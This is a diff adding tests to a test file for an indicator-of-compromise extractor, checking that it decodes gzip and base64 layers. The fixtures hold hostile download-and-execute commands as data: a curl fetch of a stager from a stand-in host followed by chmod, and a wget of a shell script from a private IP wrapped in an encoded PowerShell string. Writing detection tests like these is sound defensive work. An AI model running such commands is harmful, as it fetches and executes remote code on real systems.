@@ -1,5 +1,8 @@
 """Tests for the IOC extractor."""
 
+import base64
+import gzip
+
 from honeyknot.ioc import extract_iocs
 
 
@@ -57,3 +60,20 @@ class TestExtractIocs:
         iocs = extract_iocs(data)
         assert iocs is not None
         assert any("powershell" in s.lower() for s in iocs["shell"])
+
+    def test_gzip_layer_peeled(self):
+        inner = b"curl http://badguy.test/stager && chmod +x stager"
+        data = gzip.compress(inner)
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert any("http://badguy.test/stager" in u for u in iocs["urls"])
+        assert any("chmod" in s.lower() for s in iocs["shell"])
+
+    def test_base64_blob_in_text_decoded(self):
+        inner = b"wget http://10.0.0.1/x.sh"
+        blob = base64.b64encode(b"AAAA" * 32 + inner)  # ensure min run length
+        data = b"powershell -enc " + blob
+        iocs = extract_iocs(data)
+        assert iocs is not None
+        assert "10.0.0.1" in iocs["ips"]
+        assert any("wget" in d.lower() for d in iocs["downloads"])
